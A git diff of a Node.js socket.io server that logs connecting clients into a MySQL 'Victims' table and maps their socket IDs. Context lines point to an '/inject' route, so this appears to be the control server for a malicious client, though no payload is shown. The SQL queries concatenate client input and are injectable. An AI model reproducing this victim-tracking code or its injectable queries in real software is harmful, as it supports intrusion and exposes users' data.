@@ -7,6 +7,9 @@ var server = require('http').Server(app);
 var io = require('socket.io')(server);
 var mysql = require('mysql');
 
+//array storing active user information
+var activeUsers = [];
+
 var con = mysql.createConnection({
   host: "mysql4.cs.stonybrook.edu",
   user: "kevchang",
@@ -111,6 +114,12 @@ app.get('/logout',
     req.logout();
     res.redirect('/');
   });
+
+app.get('/test',
+function(req, res){
+  var clients = io.sockets.clients();
+  console.log(clients);
+});
 /*
 app.get('/cookies',
   require('connect-ensure-login').ensureLoggedIn(),
@@ -195,12 +204,21 @@ app.get('/inject',
 server.listen(3000);
 console.log("Listening on port 3000");
 
+
 io.on('connection', (socket) => {
   socket.on("userInfo", (userInfo) => {
+    userInfo.email = "FAKE";
+    userInfo.id = "1313413";
     var sql = "INSERT INTO Victims (email, userID) VALUES ('"+userInfo.email+"', '"+ userInfo.id+"')";
     con.query(sql, function (err, result) {
       console.log("1 victim added: "+userInfo.email);
     });
+    //make a table to map socketID with victim ID
+    var sqlIDMapping = "INSERT INTO Active (socketID, userID) VALUES ('"+socket.id+"', '"+ userInfo.id+"')";
+    con.query(sqlIDMapping, function(err, result) {
+        console.log("Mapping added: "+userInfo.id+ " " +socket.id+"");
+    });
+
     socket.emit('securityWebsites', [
       // "www.google.com",
       // "www.youtube.com"
